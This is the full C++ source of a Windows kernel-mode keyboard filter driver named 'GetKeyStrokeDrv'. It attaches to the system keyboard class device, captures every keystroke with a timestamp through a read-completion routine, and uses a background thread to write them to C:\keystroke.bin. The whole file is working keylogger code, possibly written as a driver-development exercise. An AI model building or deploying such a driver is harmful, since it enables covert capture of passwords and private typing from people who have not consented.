#include <ntddk.h>
#include <ntddkbd.h>

#define DRIVER_PREFIX "GetKeyStrokeDrv: "
#define DEVICE_PATH L"\\Device\\GetKeyStroke"
#define DRIVER_TAG 'lnKV'
#define KEYBOARD_OBJECT_PATH L"\\Device\\KeyboardClass0"
#define LOGFILE_PATH L"\\??\\C:\\keystroke.bin"

//
// Custom struct definition
//
typedef struct _DEVICE_EXTENSION
{
	KSPIN_LOCK SpinLock;
	KSEMAPHORE Semaphore;
	PDEVICE_OBJECT KeyboardDevice;
	PETHREAD LoggerThread;
	BOOLEAN ThreadTerminate;
	LIST_ENTRY ListHead;
	HANDLE LogFileHandle;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;

typedef struct _KEYSTROKE_INFORMATION
{
	LARGE_INTEGER TimeStamp;
	KEYBOARD_INPUT_DATA KeyboardInput;
} KEYSTROKE_INFORMATION, * PKEYSTROKE_INFORMATION;

typedef struct _KEYBOARD_INPUT_ENTRY
{
	LIST_ENTRY Link;
	KEYSTROKE_INFORMATION Keystroke;
} KEYBOARD_INPUT_ENTRY, * PKEYBOARD_INPUT_ENTRY;

//
// Function type definition
//
typedef PVOID(NTAPI* PExAllocatePool2)(
	_In_ POOL_FLAGS Flags,
	_In_ SIZE_T NumberOfBytes,
	_In_ ULONG Tag
	);
typedef PVOID(NTAPI* PExAllocatePoolWithTag)(
	_In_ __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
	_In_ SIZE_T NumberOfBytes,
	_In_ ULONG Tag
	);

//
// API address storage
//
PExAllocatePool2 pExAllocatePool2 = nullptr;
PExAllocatePoolWithTag pExAllocatePoolWithTag = nullptr;

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnSkipRoutine(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnRead(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS ReadCompletionRoutine(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp,
	_In_opt_ PVOID Context
);
NTSTATUS StartLoggerThread(_In_ PDEVICE_EXTENSION pDeviceExtension);
VOID LoggerThreadRoutine(_In_ PVOID pContext);
PVOID AllocateNonPagedPool(_In_ SIZE_T nPoolSize);

//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	HANDLE hFile = NULL;
	PDEVICE_OBJECT pDeviceObject = nullptr;
	PDEVICE_EXTENSION pDeviceExtension = nullptr;

	do
	{
		UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
		UNICODE_STRING keyboardPath = RTL_CONSTANT_STRING(KEYBOARD_OBJECT_PATH);
		UNICODE_STRING logFilePath = RTL_CONSTANT_STRING(LOGFILE_PATH);
		UNICODE_STRING routineName{ 0 };
		auto objectAttributes = OBJECT_ATTRIBUTES{ 0 };
		auto ioStatusBlock = IO_STATUS_BLOCK{ 0 };
		InitializeObjectAttributes(&objectAttributes, &logFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

		::RtlInitUnicodeString(&routineName, L"ExAllocatePool2");
		pExAllocatePool2 = (PExAllocatePool2)::MmGetSystemRoutineAddress(&routineName);

		if (pExAllocatePool2 == nullptr)
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve ExAllocatePool2() API. Trying to resolve ExAllocatePoolWithTag() API.\n"));
			::RtlInitUnicodeString(&routineName, L"ExAllocatePoolWithTag");
			pExAllocatePoolWithTag = (PExAllocatePoolWithTag)::MmGetSystemRoutineAddress(&routineName);
		}

		if (pExAllocatePool2)
		{
			KdPrint((DRIVER_PREFIX "ExAllocatePool2() API is at 0x%p.\n", (PVOID)pExAllocatePool2));
		}
		else if (pExAllocatePoolWithTag)
		{
			KdPrint((DRIVER_PREFIX "ExAllocatePoolWithTag() API is at 0x%p.\n", (PVOID)pExAllocatePoolWithTag));
		}
		else
		{
			KdPrint((DRIVER_PREFIX "Failed to resolve ExAllocatePool2() API and ExAllocatePoolWithTag() API.\n"));
			break;
		}

		ntstatus = ::IoCreateDevice(
			DriverObject,
			sizeof(DEVICE_EXTENSION),
			&devicePath,
			FILE_DEVICE_KEYBOARD,
			NULL,
			TRUE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ZwCreateFile(
			&hFile,
			GENERIC_WRITE | SYNCHRONIZE,
			&objectAttributes,
			&ioStatusBlock,
			nullptr,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ,
			FILE_SUPERSEDE,
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
			nullptr,
			NULL);
		KdPrint((DRIVER_PREFIX "ZwCreateFile returned 0x%08X\n", ntstatus));

		if (!NT_SUCCESS(ntstatus))
		{
			hFile = NULL;
			KdPrint((DRIVER_PREFIX "Failed to create log file at %wZ (NTSTATUS = 0x%08X).\n", &logFilePath, ntstatus));
			break;
		}

		pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
		RtlZeroMemory(pDeviceExtension, sizeof(DEVICE_EXTENSION));
		::KeInitializeSpinLock(&pDeviceExtension->SpinLock);
		::KeInitializeSemaphore(&pDeviceExtension->Semaphore, 0, 0x7FFFFFFF);
		InitializeListHead(&pDeviceExtension->ListHead);
		pDeviceExtension->LogFileHandle = hFile;
		ntstatus = ::IoAttachDevice(
			pDeviceObject,
			&keyboardPath,
			&pDeviceExtension->KeyboardDevice);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceExtension->KeyboardDevice = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to attach %wZ (NTSTATUS = 0x%08X).\n", &keyboardPath, ntstatus));
			break;
		}

		pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
		pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

		for (auto idx = 0; idx < IRP_MJ_MAXIMUM_FUNCTION; idx++)
			DriverObject->MajorFunction[idx] = OnSkipRoutine;

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_READ] = OnRead;

		ntstatus = StartLoggerThread(pDeviceExtension);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceExtension->KeyboardDevice = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to start logger thread (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "Logger thread is started successfully.\n"));
		}
	} while (false);

	if (!NT_SUCCESS(ntstatus))
	{
		if (hFile != NULL)
			::ZwClose(hFile);

		if ((pDeviceExtension != nullptr) && (pDeviceExtension->KeyboardDevice != nullptr))
			::IoDetachDevice(pDeviceExtension->KeyboardDevice);

		if (pDeviceObject != nullptr)
			::IoDeleteDevice(pDeviceObject);
	}

	return ntstatus;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pDeviceObject = DriverObject->DeviceObject;
	auto pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	auto pListHead = &pDeviceExtension->ListHead;
	auto kTimer = KTIMER{ 0 };
	auto timeout = LARGE_INTEGER{ 0 };
	timeout.QuadPart = 1000000;
	::IoDetachDevice(pDeviceExtension->KeyboardDevice);

	// Wait all keystroke entry buffer were consumed.
	while (pListHead->Flink != pListHead)
	{
		::KeSetTimer(&kTimer, timeout, nullptr);
		::KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, nullptr);
	}

	KdPrint((DRIVER_PREFIX "All keystroke information were consumed.\n"));

	// Terminate logger thread
	pDeviceExtension->ThreadTerminate = TRUE;
	::KeReleaseSemaphore(&pDeviceExtension->Semaphore, 0, 1, FALSE);
	::KeWaitForSingleObject(pDeviceExtension->LoggerThread, Executive, KernelMode, FALSE, nullptr);
	KdPrint((DRIVER_PREFIX "Logger thread is terminated.\n"));

	::ZwClose(pDeviceExtension->LogFileHandle);
	::IoDeleteDevice(pDeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnSkipRoutine(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	auto pDeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	IoSkipCurrentIrpStackLocation(Irp);

	return IoCallDriver(pDeviceExtension->KeyboardDevice, Irp);
}


NTSTATUS OnRead(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	auto pDeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	IoCopyCurrentIrpStackLocationToNext(Irp);

	NTSTATUS ntstatus = ::IoSetCompletionRoutineEx(
		DeviceObject,
		Irp,
		ReadCompletionRoutine,
		nullptr,
		TRUE,
		TRUE,
		TRUE);

	if (!NT_SUCCESS(ntstatus))
	{
		KdPrint((DRIVER_PREFIX "Failed to set read completion routine (NTSTATUS = 0x%08X).\n", ntstatus));
	}
	else
	{
		ObReferenceObject(DeviceObject);
	}

	return IoCallDriver(pDeviceExtension->KeyboardDevice, Irp);
}


NTSTATUS ReadCompletionRoutine(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp,
	_In_opt_ PVOID Context)
{
	UNREFERENCED_PARAMETER(Context);

	auto pDeviceExtension = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;

	// Inline function and macro should be in curly brace.
	if (Irp->PendingReturned)
	{
		IoMarkIrpPending(Irp);
	}

	if (NT_SUCCESS(Irp->IoStatus.Status))
	{
		auto nNumberOfKeys = (ULONG)(Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));
		auto pKeyboardInput = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

		for (auto idx = 0u; idx < nNumberOfKeys; idx++)
		{
			auto pInputData = (PKEYBOARD_INPUT_ENTRY)AllocateNonPagedPool(sizeof(KEYBOARD_INPUT_ENTRY));

			if (pInputData == nullptr)
				continue;

			::ExInterlockedInsertTailList(
				&pDeviceExtension->ListHead,
				&pInputData->Link,
				&pDeviceExtension->SpinLock);
			::KeQuerySystemTimePrecise(&pInputData->Keystroke.TimeStamp);
			RtlCopyMemory(&pInputData->Keystroke.KeyboardInput, &pKeyboardInput[idx], sizeof(KEYBOARD_INPUT_DATA));
			::KeReleaseSemaphore(&pDeviceExtension->Semaphore, 0, 1, FALSE);

			KdPrint((DRIVER_PREFIX "Captured key code 0x%04X.\n", pKeyboardInput[idx].MakeCode));
		}
	}

	ObDereferenceObject(DeviceObject);

	return STATUS_SUCCESS;
}


NTSTATUS StartLoggerThread(_In_ PDEVICE_EXTENSION pDeviceExtension)
{
	HANDLE hThread = NULL;
	NTSTATUS ntstatus = ::PsCreateSystemThread(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		NULL,
		nullptr,
		LoggerThreadRoutine,
		pDeviceExtension);

	if (NT_SUCCESS(ntstatus))
	{
		pDeviceExtension->ThreadTerminate = FALSE;
		::ObReferenceObjectByHandle(
			hThread,
			THREAD_ALL_ACCESS,
			nullptr,
			KernelMode,
			(PVOID*)&pDeviceExtension->LoggerThread,
			nullptr);
		::ZwClose(hThread);
	}

	return ntstatus;
}


VOID LoggerThreadRoutine(_In_ PVOID /* PDEVICE_EXTENSION */ pContext)
{
	auto pDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PLIST_ENTRY pListHead = &pDeviceExtension->ListHead;
	HANDLE hFile = pDeviceExtension->LogFileHandle;
	auto ioStatusBlock = IO_STATUS_BLOCK{ 0 };

	while (true)
	{
		::KeWaitForSingleObject(&pDeviceExtension->Semaphore, Executive, KernelMode, FALSE, nullptr);

		if (pDeviceExtension->ThreadTerminate)
		{
			::PsTerminateSystemThread(STATUS_SUCCESS);
		}
		else if (pListHead->Flink != pListHead)
		{
			PLIST_ENTRY pBufferToFree = pListHead->Flink;
			NTSTATUS ntstatus = ::ZwWriteFile(
				hFile,
				NULL,
				nullptr,
				nullptr,
				&ioStatusBlock,
				&((PKEYBOARD_INPUT_ENTRY)pBufferToFree)->Keystroke,
				sizeof(KEYSTROKE_INFORMATION),
				nullptr,
				nullptr);

			if (!NT_SUCCESS(ntstatus))
			{
				KdPrint((DRIVER_PREFIX "Failed to write key code data 0x%04X to %ws (NTSTATUS = 0x%08X).\n",
					((PKEYBOARD_INPUT_ENTRY)pBufferToFree)->Keystroke.KeyboardInput.MakeCode,
					LOGFILE_PATH,
					ntstatus));
			}
			else
			{
				KdPrint((DRIVER_PREFIX "Key code data 0x%04X is written in %ws successfully.\n",
					((PKEYBOARD_INPUT_ENTRY)pBufferToFree)->Keystroke.KeyboardInput.MakeCode,
					LOGFILE_PATH));
			}

			::ExInterlockedRemoveHeadList(pListHead, &pDeviceExtension->SpinLock);
			::ExFreePoolWithTag(pBufferToFree, (ULONG)DRIVER_TAG);
		}
	}
}


//
// Helper functions
//
PVOID AllocateNonPagedPool(_In_ SIZE_T nPoolSize)
{
	PVOID pNonPagedPool = nullptr;

	// ExAllocatePool2 API was introduced from Windows 10 2004.
	// Use ExAllocatePoolWithTag API on old OSes.
	if (pExAllocatePool2)
	{
		pNonPagedPool = pExAllocatePool2(POOL_FLAG_NON_PAGED, nPoolSize, (ULONG)DRIVER_TAG);
	}
	else if (pExAllocatePoolWithTag)
	{
		pNonPagedPool = pExAllocatePoolWithTag(NonPagedPool, nPoolSize, (ULONG)DRIVER_TAG);
		RtlZeroMemory(pNonPagedPool, nPoolSize);
	}

	return pNonPagedPool;
}